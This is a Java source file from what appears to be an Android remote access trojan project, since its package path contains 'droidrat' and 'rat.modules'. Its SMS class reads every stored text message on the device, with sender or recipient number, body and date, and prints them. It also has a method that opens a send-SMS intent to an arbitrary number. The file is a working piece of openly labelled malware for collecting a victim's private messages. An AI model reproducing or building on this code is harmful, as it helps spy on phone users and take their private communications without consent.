package com.je_chen.droidrat_je.rat.modules.appintent.sms;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import java.util.Date;

public class SMS {

    public void getAllSms(Context context) {
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (cursor != null) {
            totalSMS = cursor.getCount();
            if (cursor.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat = new Date(Long.parseLong(smsDate));
                    String type;
                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }
                    System.out.println(smsDate);
                    System.out.println(number);
                    System.out.println(body);
                    cursor.moveToNext();
                }
            }
            cursor.close();
        }
    }

    public void sendSMS(Context context,String mobileNumber,String smsText){
        Intent intent = new Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:"+ mobileNumber));
        intent.putExtra("sms_body", smsText);
        context.startActivity(intent);
    }
}
